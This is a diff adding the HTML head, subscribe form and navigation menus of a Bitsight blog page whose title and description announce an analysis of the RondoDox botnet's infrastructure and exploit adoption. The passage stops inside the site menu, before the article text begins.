@@ -1,0 +1,2881 @@
+<!DOCTYPE html>
+<html  lang="en" dir="ltr" prefix="og: https://ogp.me/ns#">
+  <head>
+    <meta charset="utf-8" />
+<noscript><style>form.antibot * :not(.antibot-message) { display: none !important; }</style>
+</noscript><meta name="description" content="A deep dive into the RondoDox botnet, examining its infrastructure, exploit adoption timeline, and methods used to target internet-exposed systems." />
+<link rel="canonical" href="https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis" />
+<meta property="og:site_name" content="Bitsight" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis" />
+<meta property="og:title" content="RondoDox Botnet: From Zero to 174 Exploited Vulnerabilities | Bitsight" />
+<meta property="og:description" content="A deep dive into the RondoDox botnet, examining its infrastructure, exploit adoption timeline, and methods used to target internet-exposed systems." />
+<meta property="og:image" content="https://www.bitsight.com/sites/default/files/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png" />
+<meta property="og:image:height" content="" />
+<script type="text/javascript" src="//cdn.optimizely.com/js/26349430206.js"></script>
+<meta name="Generator" content="Drupal 10 (https://www.drupal.org)" />
+<meta name="MobileOptimized" content="width" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@graph": [
+        {
+            "@type": "BlogPosting",
+            "@id": "https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis",
+            "name": "RondoDox Botnet: From Zero to 174 Exploited Vulnerabilities",
+            "headline": "RondoDox Botnet: From Zero to 174 Exploited Vulnerabilities",
+            "description": "A deep dive into the RondoDox botnet, examining its infrastructure, exploit adoption timeline, and methods used to target internet-exposed systems.",
+            "datePublished": "2026-03-11",
+            "author": {
+                "@type": "Person",
+                "@id": "https://www.bitsight.com/our-team/joao-godinho#Person",
+                "name": "João Godinho",
+                "url": "https://www.bitsight.com/our-team/joao-godinho"
+            },
+            "publisher": {
+                "@type": "Organization",
+                "name": "BitSight",
+                "url": "https://www.bitsight.com/",
+                "logo": {
+                    "@type": "ImageObject",
+                    "representativeOfPage": "False",
+                    "url": "https://www.bitsight.com/sites/default/files/2023/04/19/Bitsight%20Logo_Black_RGB.svg"
+                }
+            },
+            "mainEntityOfPage": "https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis"
+        }
+    ]
+}</script>
+<meta name="format-detection" content="telephone=no" />
+<link rel="icon" href="/sites/default/files/favicon.ico" type="image/vnd.microsoft.icon" />
+
+          <script async="async" type="text/javascript" crossorigin="" src="//consent.trustarc.com/notice?domain=bitsighttech.com&c=teconsent&js=nj&noticeType=bb&text=true&pn=1&gtm=1"></script>
+      <script>
+        (function() {
+          var s = document.createElement('script');
+          s.src = 'https://consent.trustarc.com/asset/integration-builder-v1.1.0.min.js';
+          s.onload = function() {
+            var builder = new IntegrationBuilder({
+              "consent_config": "notice_behavior",
+              "logging": true,
+              "optout_setting": "eu"
+            }).TrustArcPageReload({
+              "timeout": 500,
+              "strict_consent_only": true
+            }).build();
+          };
+          s.onerror = function() {
+            console.error('Failed to load the Integration Studio script.');
+          };
+          document.head.appendChild(s);
+        })();
+      </script>
+        <title>RondoDox Botnet: From Zero to 174 Exploited Vulnerabilities | Bitsight</title>
+    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_vn0dK-jB3pAMaxz-jdMzhmmpnuYHbc_klSETXnGFIfA.css?delta=0&amp;language=en&amp;theme=bitsight_theme&amp;include=eJx9U9GSgyAM_CGRmfshJ0CqaYE4JNb694e1fRHvXsKwG0l2EyErOVYLx9nfuKTOoSqWAV8zC4bhRrFexY6YsUDsHKnQOOmgEya0jsNmFF_aEIsq5zPqoQSzkk6GEox4psfIrq0xIQTK4xm-L2k2CfNyJiJsvDQNHaj5eZ2JBJQv30kYCM5g5oDGuMhNPwczF66WNcoEofjJOG7KCymaG3N1-ZLa1V9TK9WCELE0WoU9QbwUJYsTX8g1HSqM0mB1sGbdhNatkbuie--Lf1SblMugzFFpFnsrnNVgDuYu_9KiW9wH2-bUMG8Gct0SJc5GfNX5Zx4_sZRqhnS13_riw4ayzBD7z7U7Zj8EEr_nbpYzeo7de8L2WPHew7zX6r7WDm9rLWXSTjZRTNaBYPckXMW-Y584LLWxjxdfT3q4w6sBMVbbsvYBFShKrzyOF99-0xKK7L_Imd_DL_L8dY8" />
+<link rel="stylesheet" media="all" href="/sites/default/files/css/css_86lymuDRn4gl6-wPXDTgu1iMS8J7vr9EYpk0YEVwpGk.css?delta=1&amp;language=en&amp;theme=bitsight_theme&amp;include=eJx9U9GSgyAM_CGRmfshJ0CqaYE4JNb694e1fRHvXsKwG0l2EyErOVYLx9nfuKTOoSqWAV8zC4bhRrFexY6YsUDsHKnQOOmgEya0jsNmFF_aEIsq5zPqoQSzkk6GEox4psfIrq0xIQTK4xm-L2k2CfNyJiJsvDQNHaj5eZ2JBJQv30kYCM5g5oDGuMhNPwczF66WNcoEofjJOG7KCymaG3N1-ZLa1V9TK9WCELE0WoU9QbwUJYsTX8g1HSqM0mB1sGbdhNatkbuie--Lf1SblMugzFFpFnsrnNVgDuYu_9KiW9wH2-bUMG8Gct0SJc5GfNX5Zx4_sZRqhnS13_riw4ayzBD7z7U7Zj8EEr_nbpYzeo7de8L2WPHew7zX6r7WDm9rLWXSTjZRTNaBYPckXMW-Y584LLWxjxdfT3q4w6sBMVbbsvYBFShKrzyOF99-0xKK7L_Imd_DL_L8dY8" />
+
+    <script src="https://kit.fontawesome.com/bc8e4d7021.js" defer crossorigin="anonymous" data-search-pseudo-elements></script>
+
+                  <meta property="article:category" content="Bitsight Research">
+      </head>
+  <body class="path-node page-node-type-blog">
+        <a href="#main-content" class="visually-hidden focusable skip-link">
+      Skip to main content
+    </a>
+    
+      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
+    
+
+
+
+
+
+
+<div class="layout-container">
+      <div data-sitewide-alert aria-live="polite" id="block-bitsight-theme-sitewide-alerts" class="block block-bitsight-common block-sitewide-alert">
+    
+    
+          <div></div>
+
+      </div>
+
+<div  id="block-bitsight-theme-subscribe" class="subscribe-webform banner">
+  
+  
+  <span class="banner-close">Close</span>
+  <div class="subscribe-webform__form-content container">
+    <span id="webform-submission-subscribe-node-18826-form-ajax-content"></span><div id="webform-submission-subscribe-node-18826-form-ajax" class="webform-ajax-form-wrapper" data-effect="fade" data-progress-type="throbber"><form class="webform-submission-form webform-submission-add-form webform-submission-subscribe-form webform-submission-subscribe-add-form webform-submission-subscribe-node-18826-form webform-submission-subscribe-node-18826-add-form js-webform-details-toggle webform-details-toggle enable-clientside-validation antibot" data-drupal-selector="webform-submission-subscribe-node-18826-add-form" data-action="/blog/rondodox-botnet-infrastructure-analysis" action="/antibot" method="post" id="webform-submission-subscribe-node-18826-add-form" accept-charset="UTF-8">
+  
+  
+<div class="webform-submission-form--inner"><noscript>
+  <div class="antibot-no-js antibot-message antibot-message-warning">You must have JavaScript enabled to use this form.</div>
+</noscript>
+<input data-drupal-selector="edit-utm-source" type="hidden" name="utm_source" value="(direct)" />
+<input data-drupal-selector="edit-utm-medium" type="hidden" name="utm_medium" value="(none)" />
+<input data-drupal-selector="edit-utm-campaign" type="hidden" name="utm_campaign" value="" />
+<input data-drupal-selector="edit-utm-adgroup" type="hidden" name="utm_adgroup" value="" />
+<input data-drupal-selector="edit-utm-term" type="hidden" name="utm_term" value="" />
+<input data-drupal-selector="edit-utm-matchtype" type="hidden" name="utm_matchtype" value="" />
+<input data-drupal-selector="edit-utm-content" type="hidden" name="utm_content" value="" />
+<input data-drupal-selector="edit-gclid" type="hidden" name="gclid" value="" />
+<input data-drupal-selector="edit-sfdccampaignid" type="hidden" name="sfdccampaignid" value="" />
+<div id="edit-description-text" class="js-form-item form-item form-type-webform-markup js-form-type-webform-markup form-item-description-text js-form-item-description-text form-no-label">
+        <p>Cut through the noise—get monthly actionable cyber threat research and industry insights from Bitsight's blog.</p>
+
+        </div>
+
+<div class="subscribe--right js-form-wrapper form-wrapper" data-drupal-selector="edit-right" id="edit-right">
+<div class="subscribe--right--top js-form-wrapper form-wrapper" data-drupal-selector="edit-right-top" id="edit-right-top"><div class="js-form-item form-item form-type-email js-form-type-email form-item-email js-form-item-email form-no-label">
+      <label for="edit-email" class="visually-hidden js-form-required form-required">Email</label>
+        
+<input placeholder="Enter email address*" class="text" data-drupal-selector="edit-email" data-msg-required="Email field is required." data-msg-email="Email does not contain a valid email." data-msg-maxlength="Email field has a maximum length of 254." type="email" id="edit-email" name="email" value="" placeholder="Enter email address*" required="required" aria-required="true"/>
+
+        </div>
+
+
+<div data-drupal-selector="edit-actions" class="form-actions webform-actions js-form-wrapper form-wrapper" id="edit-actions"><input class="webform-button--submit button button--primary js-form-submit form-submit btn btn--primary btn--md" data-drupal-selector="edit-actions-submit" data-disable-refocus="true" type="submit" id="edit-actions-submit" name="op" value="Subscribe" />
+
+</div>
+</div>
+
+<div class="subscribe--right--bottom js-form-wrapper form-wrapper" data-drupal-selector="edit-right-bottom" id="edit-right-bottom">  <div class="webform__checkbox-container">
+    <div data-webform-states-no-clear>
+              <label for="edit-marketing-email-consent" class="visually-hidden js-form-required form-required">Marketing Consent</label><img class='webform__required-asterisk' src='/themes/custom/bitsight_theme/src/assets/required.svg' alt='required' />
+                        <input data-drupal-selector="edit-marketing-email-consent" aria-describedby="edit-marketing-email-consent--description" disabled="disabled" data-msg-required="Marketing Consent field is required." type="checkbox" id="edit-marketing-email-consent" name="marketing_email_consent" value="Yes" checked="checked" class="form-checkbox required" required="required" aria-required="true" />
+
+                                        <div class="webform__checkbox__read-more-container">
+          <a class="webform__read-more-link" href="#">Read more</a>
+            <div class="webform__read-more-text">
+              
+<div id="edit-marketing-email-consent--description" class="webform-element-description"><p>By subscribing, you agree to receive our newsletter. You can unsubscribe anytime. See our <a href="http://www.bitsight.com/privacy-policy">Privacy Policy</a>&nbsp;for more details.</p>
+</div>
+
+            </div>
+        </div>
+          </div>
+    </div>
+</div>
+</div>
+<input data-drupal-selector="edit-antibot-key" type="hidden" name="antibot_key" value="" />
+<input autocomplete="off" data-drupal-selector="form-y8thqnsisz-h2tax3-um7awlhkytg0cs65t3qqvkjy4" type="hidden" name="form_build_id" value="form-Y8thQNsiSZ_h2tAx3_um7AWLhKYTG0CS65t3QqVkJy4" />
+<input data-drupal-selector="edit-webform-submission-subscribe-node-18826-add-form" type="hidden" name="form_id" value="webform_submission_subscribe_node_18826_add_form" />
+<input data-drupal-selector="edit-honeypot-time" type="hidden" name="honeypot_time" value="15Ax4b4hkNnRa6jNjxsHj2P9ftBeAYuf9u3R3yFnOVY" />
+
+<div class="middle_name-textfield js-form-wrapper form-wrapper" style="display: none !important;"><div class="js-form-item form-item form-type-textfield js-form-type-textfield form-item-middle-name js-form-item-middle-name">
+      <label for="edit-middle-name">Leave this field blank</label>
+        
+<input class="text" autocomplete="off" data-drupal-selector="edit-middle-name" data-msg-maxlength="Leave this field blank field has a maximum length of 128." type="text" id="edit-middle-name" name="middle_name" value=""/>
+
+        </div>
+</div>
+</div>
+
+  
+</form>
+</div>
+  </div>
+</div>
+
+
+  
+  <header role="banner"  class="site-header bg-color--white dark-text">
+          <div class="header-top-wrapper">
+        
+
+  <div class="region region-header-top site-header-top container">
+    
+
+<div class='c-search-bar'>
+  <button class='c-search-bar__button' aria-expanded='false' aria-controls="search-bar" aria-label='toggle searchbar'>
+    <span class='c-search-bar__button-icon' aria-hidden='true' focusable='false'>
+      <svg class='open' xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewbox='0 0 32 32' fill='none'>
+        <path d='M12.6667 4C14.9652 4 17.1696 4.91309 18.7949 6.53841C20.4202 8.16372 21.3333 10.3681 21.3333 12.6667C21.3333 14.8133 20.5467 16.7867 19.2533 18.3067L19.6133 18.6667H20.6667L27.3333 25.3333L25.3333 27.3333L18.6667 20.6667V19.6133L18.3067 19.2533C16.7341 20.5957 14.7343 21.3332 12.6667 21.3333C10.3681 21.3333 8.16372 20.4202 6.53841 18.7949C4.91309 17.1696 4 14.9652 4 12.6667C4 10.3681 4.91309 8.16372 6.53841 6.53841C8.16372 4.91309 10.3681 4 12.6667 4ZM12.6667 6.66667C9.33333 6.66667 6.66667 9.33333 6.66667 12.6667C6.66667 16 9.33333 18.6667 12.6667 18.6667C16 18.6667 18.6667 16 18.6667 12.6667C18.6667 9.33333 16 6.66667 12.6667 6.66667Z' fill='black'/>
+      </svg>
+      <svg class='close' xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewbox='0 0 32 32' fill='none'>
+        <path d='M25.3333 8.54699L23.4533 6.66699L16 14.1203L8.54663 6.66699L6.66663 8.54699L14.12 16.0003L6.66663 23.4537L8.54663 25.3337L16 17.8803L23.4533 25.3337L25.3333 23.4537L17.88 16.0003L25.3333 8.54699Z' fill='black'/>
+      </svg>
+    </span>
+    <span class='c-search-bar__button-text visually-hidden'>
+      Expand Search
+    </span>
+  </button>
+  <div class='c-search-bar__content' id="search-bar" aria-hidden='true'>
+    <form action="/search" method="get" id="views-exposed-form-search-search-page" accept-charset="UTF-8">
+  <div  class="views-exposed-form--inner">
+      
+  <div class="js-form-item form-item form-type-textfield js-form-type-textfield form-item-search js-form-item-search">
+      <label for="edit-search">Search for</label>
+        
+<input class="text" placeholder="Enter search term" data-drupal-selector="edit-search" type="text" id="edit-search" name="search" value=""/>
+
+        </div>
+
+<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions"><input data-drupal-selector="edit-submit-search" type="submit" id="edit-submit-search" value="Apply" class="button js-form-submit form-submit" />
+</div>
+
+  </div>
+
+</form>
+
+  </div>
+</div>
+<nav role="navigation" aria-labelledby="block-utility-menu" id="block-utility">
+            
+  <h2 class="visually-hidden" id="block-utility-menu">Utility</h2>
+  
+
+        
+              <ul class="menu menu--horizontal">
+              <li>
+        <a href="/blog" data-drupal-link-system-path="node/531">Blog</a>
+              </li>
+          <li>
+        <a href="/trace" data-drupal-link-system-path="node/13556">TRACE</a>
+              </li>
+          <li>
+        <a href="/demo/bitsight-demo" data-drupal-link-system-path="node/8866">Request Demo</a>
+              </li>
+          <li>
+        <a href="#chatnow">Chat With Us</a>
+              </li>
+          <li>
+        <a href="https://service.bitsighttech.com/">Login</a>
+              </li>
+        </ul>
+  
+
+
+  </nav>
+
+  </div>
+
+      </div>
+        <div class="header-bottom-wrapper">
+      <div class="site-header--container">
+        
+        
+  <div  id="block-sitebranding" class="site-branding">
+  
+  
+      <a class="site-logo" href="/" rel="home">
+      <img class="site-logo--primary" src="/themes/custom/bitsight_theme/logo.svg" alt="Home" fetchpriority="high" />
+        <img class="site-logo--secondary" src="https://www.bitsight.com/themes/custom/bitsight_theme/dist/images/bitsight-logo-white-text.svg" alt="Home" fetchpriority="high" />
+  
+    </a>
+      
+</div>
+
+  
+
+
+<div class="main-menu__navicon mobile-only">
+  <button class="main-menu__navicon-btn">
+    <span></span>
+    <span></span>
+    <span></span>
+    <span class="visually-hidden">Toggle menu</span>
+  </button>
+</div>
+
+<section class="main-menu__wrapper">
+  <div class="c-search-bar__content mobile-only">
+      <div class="views-exposed-form bef-exposed-form block block-views block-views-exposed-filter-blocksearch-search-page" data-drupal-selector="views-exposed-form-search-search-page" id="block-bitsight-search-mobile">
+    
+    
+          <form action="/search" method="get" id="views-exposed-form-search-search-page" accept-charset="UTF-8">
+  <div  class="views-exposed-form--inner">
+      
+  <div class="js-form-item form-item form-type-textfield js-form-type-textfield form-item-search js-form-item-search">
+      <label for="edit-search">Search for</label>
+        
+<input class="text" placeholder="Enter search term" data-drupal-selector="edit-search" type="text" id="edit-search" name="search" value=""/>
+
+        </div>
+
+<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions"><input data-drupal-selector="edit-submit-search" type="submit" id="edit-submit-search" value="Apply" class="button js-form-submit form-submit" />
+</div>
+
+  </div>
+
+</form>
+
+      </div>
+
+  </div>
+  <div class="main-menu__inner">
+    <nav id="a11y-menu" class="main-menu" aria-label="Main menu">
+          <ul data-region="header_bottom" class="menu menu-level-0 menu--horizontal">
+          
+    <li class="menu-item menu-item--expanded menu-item-name--solutions for-view-mode--megamenu_panel">
+              <span>Solutions</span>
+                          
+<div class="menu__dropdown">
+  <div class="menu__dropdown-inner container">
+        
+      <ul class="menu menu-level-1">
+    
+          
+    <li class="menu-item menu-item--expanded menu-item-name--solutions">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Solutions</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--third-party-risk-management">
+              <div class="menu-title"><a href="/products/third-party-risk-management" data-drupal-link-system-path="node/8731">Third-Party Risk Management</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--exposure-management">
+              <div class="menu-title"><a href="/solutions/exposure-management" data-drupal-link-system-path="node/15421">Exposure Management</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--cyber-threat-intelligence">
+              <div class="menu-title"><a href="/products/cyber-threat-intelligence" data-drupal-link-system-path="node/15516">Cyber Threat Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--governance--analytics">
+              <div class="menu-title"><a href="/products/governance-and-analytics" data-drupal-link-system-path="node/12571">Governance &amp; Analytics</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--professional-services">
+              <div class="menu-title"><a href="/services" data-drupal-link-system-path="node/241">Professional Services</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--view-all-solutions for-view-mode--section">
+              <div class="menu-title"><a href="/solutions/our-solutions" data-drupal-link-system-path="node/15956">View all solutions</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-section menu-dropdown menu-dropdown-2 menu-type-section">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--industries">
+              <div class="menu-title"><a href="/solutions/our-solutions#industry" data-drupal-link-system-path="node/15956">Industries</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--integrations">
+              <div class="menu-title"><a href="/solutions/our-solutions#integrations" data-drupal-link-system-path="node/15956">Integrations</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--pricing-plans">
+              <div class="menu-title"><a href="/pricing-packaging" data-drupal-link-system-path="node/19516">Pricing/Plans</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--products for-view-mode--submenu_columns">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Products</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-submenu-columns menu-dropdown menu-dropdown-1 menu-type-submenu_columns">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item--expanded menu-item-name--for-governance--risk">
+              <div class="menu-title"><span>For Governance &amp; Risk</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+    <ul class="menu menu-level-3">
+          
+    <li class="menu-item menu-item-name--third-party-continuous-monitoring--response">
+              <div class="menu-title"><a href="/products/continuous-monitoring" data-drupal-link-system-path="node/13081">Third-Party Continuous Monitoring &amp; Response</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--vendor-risk-management">
+              <div class="menu-title"><a href="/products/vendor-risk-management" data-drupal-link-system-path="node/12471">Vendor Risk Management</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--security-posture-management">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/products/security-posture-management" data-drupal-link-system-path="node/18856">Security Posture Management</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--trust-management-hub">
+              <div class="menu-title"><a href="/products/trust-management-hub" data-drupal-link-system-path="node/14176">Trust Management Hub</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--security-ratings">
+              <div class="menu-title"><a href="/security-ratings" data-drupal-link-system-path="node/8726">Security Ratings</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--for-security-operations">
+              <div class="menu-title"><span>For Security Operations</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+    <ul class="menu menu-level-3">
+          
+    <li class="menu-item menu-item-name--supply-chain-exposure-management">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/products/supply-chain-exposure-management" data-drupal-link-system-path="node/19286">Supply Chain Exposure Management</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--identity-intelligence--credentials">
+              <div class="menu-title"><a href="/products/identity-intelligence" data-drupal-link-system-path="node/16146">Identity Intelligence &amp; Credentials</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--vulnerability-intelligence">
+              <div class="menu-title"><a href="/products/vulnerability-intelligence" data-drupal-link-system-path="node/16166">Vulnerability Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--attack-surface-intelligence">
+              <div class="menu-title"><a href="/products/attack-surface-intelligence" data-drupal-link-system-path="node/16161">Attack Surface Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--adversary--ransomware-intelligence">
+              <div class="menu-title"><a href="/products/adversary-intelligence" data-drupal-link-system-path="node/18776">Adversary &amp; Ransomware Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--brand--executive-intelligence for-view-mode--default">
+              <div class="menu-title"><a href="/products/brand-threat-intelligence" data-drupal-link-system-path="node/17741">Brand &amp; Executive Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--sectoral-intelligence for-view-mode--default">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/products/sectoral-intelligence" data-drupal-link-system-path="node/19901">Sectoral Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+      
+            <div class="field field--name-field-cta field--type-custom field--label-hidden field__item">
+                          
+  <h2 class="eyebrow field__item">Spotlight</h2>
+  <div class="cta-title field__item">NEW: Dark Web Intelligence for Supply Chains</div>
+  <div class="body-text custom-field__item field--name-text field--type-string-long field--label-hidden"><p>Detect early signs of <strong>real-world targeting and exposure</strong> across your vendor ecosystem beyond what static scores can reveal.</p>
+</div>
+  <div class="cta-link custom-field__item field--name-link-uri field--type-uri field--label-hidden"><a href="/blog/dark-web-intelligence-for-supply-chain-risk">View product</a></div>
+
+              </div>
+      
+  </ul>
+
+
+
+  </div>
+  <div class="cta-secondary">
+    <div class="cta-secondary--inner container">
+      
+            <div class="field field--name-field-cta-secondary field--type-link field--label-hidden field__item">
+                          <a href="/demo/bitsight-demo" hreflang="en">Get a demo</a>
+              </div>
+      
+    </div>
+  </div>
+</div>
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--platform for-view-mode--megamenu_panel">
+              <span>Platform</span>
+                          
+<div class="menu__dropdown">
+  <div class="menu__dropdown-inner container">
+        
+      <ul class="menu menu-level-1">
+    
+            <div class="field field--name-field-description field--type-custom field--label-hidden field__item">
+                          
+  <h2 class="description-title field__item">Trust in our data</h2>
+  <div class="description-text custom-field__item field--name-text field--type-string-long field--label-hidden"><p>We combine real-time discovery of networks, assets, and vulnerabilities with our AI attribution engine and security researchers to amass one of the largest and mapped risk datasets in the world.</p></div>
+
+              </div>
+      
+          
+    <li class="menu-item menu-item--expanded menu-item-name--cyber-intelligence-platform">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Cyber Intelligence Platform</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--platform-overview">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/platform" data-drupal-link-system-path="node/18276">Platform Overview</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--assets--infrastructure">
+              <div class="menu-title"><a href="/platform/enterprise-assets-and-infrastructure" data-drupal-link-system-path="node/18286">Assets &amp; Infrastructure</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--deep-dark--clear-web">
+              <div class="menu-title"><a href="/platform/cyber-threat-intelligence-data" data-drupal-link-system-path="node/18281">Deep, Dark &amp; Clear Web</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--vendor-network">
+              <div class="menu-title"><a href="/platform/vendor-network" data-drupal-link-system-path="node/18261">Vendor Network</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--preemptive-insights">
+              <div class="menu-title"><a href="/platform/cyber-risk-analytics-and-insights" data-drupal-link-system-path="node/18681">Preemptive Insights</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--mcp--api-data-delivery for-view-mode--default">
+              <div class="menu-title"><a href="/platform/mcp-api-data-delivery" data-drupal-link-system-path="node/20091">MCP &amp; API Data Delivery</a></div>
+                          
+  
